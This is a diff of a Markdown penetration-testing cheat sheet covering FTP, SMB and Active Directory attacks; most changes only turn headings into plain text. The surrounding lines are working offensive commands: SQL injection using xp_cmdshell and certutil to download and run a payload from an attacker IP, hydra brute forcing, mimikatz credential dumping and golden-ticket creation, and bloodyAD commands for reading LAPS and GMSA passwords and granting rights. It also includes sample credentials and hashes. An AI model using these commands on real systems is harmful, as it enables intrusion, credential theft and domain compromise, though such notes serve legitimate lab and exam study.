@@ -66,7 +66,7 @@ FTP enumeration
 ftp <IP>
 ```
 
-#login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password
+login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password
 
 ```bash
 put <file> #uploading file
@@ -84,7 +84,7 @@ nmap -p21 --script=<name> <IP>
 hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice versa
 ```
 
-# Check for vulnerabilities associated with the identified version.
+Check for vulnerabilities associated with the identified version.
 
 
 
@@ -161,13 +161,7 @@ admin';EXEC xp_cmdshell 'certutil -urlcache -split  -f http://192.168.45.198:800
 admin';EXEC xp_cmdshell 'c:\windows\temp\r80.exe'; --
 ```
 
-HTTP/S enumeration
-	• View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.
-	• Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
-	• check /robots.txt folder
-	• Look for the hostname and add the relevant one to /etc/hosts file.
-	• Directory and file discovery - Obtain any hidden files that may contain juicy information
-
+Directory 
 
 ```bash
 dirbuster
@@ -311,11 +305,12 @@ impacket-smbclient username@domain -hashes :2385e2c9d18f87ce81bee8ba91874c5d
 impacket-smbclient "<username>":"password"@192.168.20.20
 impacket-smbclient ss:""@192.168.20.20
 ```
-#shares
-#use <share_name>
-#ls
-#mget*
-
+Accessing shares
+```bash
+use <share_name>
+ls
+mget*
+```
 
 
 SMBmap
@@ -587,7 +582,7 @@ cd "C:\Users\fcastle\Downloads\mimikatz_trunk\x64"
 mimikatz.exe
 ```
 
-# Commands
+Commands
 ```bash
 privilege::debug
 lsadump::lsa /inject /name:krbtgt
@@ -603,11 +598,11 @@ S-1-5-21-1796002695-2329991732-2223296958
 ```bash
 kerberos::golden /User:MyAdministrator /domain:marvel.local /sid:S-1-5-21-1796002695-2329991732-2223296958 /krbtgt:21a84dbb8f81aa02316606b488a4a9eb /id:500 /ptt
 ```
-# id:500 - Administrator account
-# ptt - pass the ticket into the session
+id:500 - Administrator account
+ptt - pass the ticket into the session
 
 
-# Domain SID
+Domain SID
 ```bash
 ps> whoami /user                                                                                         # this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-198737
 ```
@@ -617,10 +612,6 @@ To change password of a user
 ```bash
 net user michael ahmed1$
 ```
-
-
-chanAD
-
 
 Change password
 ```bash
@@ -653,42 +644,42 @@ bloodyAD
 
 # 1. Core Enumeration (most used & important first)
 
-# Get all users of the domain
+Get all users of the domain
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user    
 ```
 
-# Get all computers of the domain
+Get all computers of the domain
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer 
 ```
 
-# Get group members
+Get group members
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member
 ```
 
-# Get AD DNS records
+Get AD DNS records
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump     
 ```
 
-# Get UserAccountControl flags for a user
+Get UserAccountControl flags for a user
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl       
 ```
 
-# Get AD functional level (msDS-Behavior-Version)
+Get AD functional level (msDS-Behavior-Version)
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version    
 ```
 
-# Get minimum password length policy
+Get minimum password length policy
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength      
 ```
 
-# Read ms-DS-MachineAccountQuota (quota for adding computer objects)
+Read ms-DS-MachineAccountQuota (quota for adding computer objects)
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota 
 ```
@@ -696,27 +687,27 @@ bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<
 
 # 2. Privilege Escalation & Credential Access
 
-# Read LAPS password (ms-Mcs-AdmPwd)
+Read LAPS password (ms-Mcs-AdmPwd)
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd
 ```
 
-# Read GMSA account password (msDS-ManagedPassword)
+Read GMSA account password (msDS-ManagedPassword)
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword
 ```
 
-# Read GMSA account password using Kerberos (dc-ip + -k)
+Read GMSA account password using Kerberos (dc-ip + -k)
 ```bash
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword 
 ```
 
-# Enable DONT_REQ_PREAUTH for ASREPRoast (LDAP bind change)
+Enable DONT_REQ_PREAUTH for ASREPRoast (LDAP bind change)
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<USERNAME>' DONT_REQ_PREAUTH
 ```
 
-# Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
+Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
 ```bash
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac '<USERNAME>' -f DONT_REQ_PREAUTH 
 ```
@@ -724,7 +715,7 @@ bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac '<USERNAME>' -f D
 
 # 3. Domain Management / Modification
 
-# Add user to a group
+Add user to a group
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'   
 
@@ -733,47 +724,47 @@ bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "<owned user>" -p "newP@ss
 bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "<owned user>" -p "newP@ssword2022" add genericAll <exploitable user>  <owned user>
 ```
 
-# Add user to a group using Kerberos
+Add user to a group using Kerberos
 ```bash
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'   
 ```
 
-# Set a password for a user (using Kerberos + dc-ip)
+Set a password for a user (using Kerberos + dc-ip)
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST> 
 ```
 
-# Enable machine account as trusted for delegation
+Enable machine account as trusted for delegation
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<MACHINE_ACCOUNT>$' -f TRUSTED_FOR_DELEGATION 
 ```
 
-# Add a computer object on behalf of a user
+Add a computer object on behalf of a user
 ```bash
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'
 ```
 
-# Grant genericAll permissions to a specific OU for a user
+Grant genericAll permissions to a specific OU for a user
 ```bash
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'
 ```
 
-# Add a new DNS entry
+Add a new DNS entry
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>
 ```
 
-# Remove a DNS entry
+Remove a DNS entry
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>  
 ```
 
-# Enable (clear) ACCOUNTDISABLE for a user (i.e., enable account)
+Enable (clear) ACCOUNTDISABLE for a user (i.e., enable account)
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac '<USERNAME>' ACCOUNTDISABLE 
 ```
 
-# Enable (clear) ACCOUNTDISABLE for a user using Kerberos
+Enable (clear) ACCOUNTDISABLE for a user using Kerberos
 ```bash
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac '<USERNAME>' -f ACCOUNTDISABLE
 ```
@@ -781,22 +772,22 @@ bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac '<USERNAME>' -
 
 # 4. SPN and Certificate Management
 
-# Set a Service Principal Name (SPN) for a user/computer
+Set a Service Principal Name (SPN) for a user/computer
 ```bash
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName
 ```
 
-# Set a Service Principal Name (SPN) using Kerberos
+Set a Service Principal Name (SPN) using Kerberos
 ```bash
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName  
 ```
 
-# Set a Service Principal Name (SPN) using Kerberos with explicit value
+Set a Service Principal Name (SPN) using Kerberos with explicit value
 ```bash
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'
 ```
 
-# Set altSecurityIdentities (certificate UPN/CN) for a user using Kerberos
+Set altSecurityIdentities (certificate UPN/CN) for a user using Kerberos
 ```bash
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -k set object '<USERNAME>' altSecurityIdentities -v 'X509:<UPN=<USERNAME>@<DOMAIN>>/CN=<CN>' 
 ```
@@ -979,7 +970,7 @@ mget *
 Password-Hash Cracking
 
 Hashcat
-#Obtain the Hash module number
+Obtain the Hash module number
 ```bash
 hashcat -m <number> hash wordlists.txt --force
 ```
@@ -1040,7 +1031,7 @@ python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iET
 python3 targetedKerberoast.py -v -d 'laser.com' -u 'yulia.weber' -p 'Yulia@Laser777' --dc-ip 192.168.138.172
 ```
 
-#OneLiner to get hashes and plaintext passwords
+OneLiner to get hashes and plaintext passwords
 
 ```bash
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"   
@@ -1141,7 +1132,7 @@ evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy
 impacket-secretsdump ksc:'Y1f683X7r@8'@10.20.240.203 
 ```
 
-##RCE
+
 
 ```bash
 psexec.py test.local/john:password123@10.10.10.1
@@ -1205,7 +1196,7 @@ menu                                                                # to view co
 
 #There are several commands to run
 
-#This is an example for running a binary
+This is an example for running a binary
 
 ```bash
 evil-winrm -i <IP> -u user -p pass -e /opt/privsc
@@ -2295,6 +2286,7 @@ shutdown
 ```bash
 cmd.exe /c "shutdown /r /t 0"
 ```
+
 
 
 
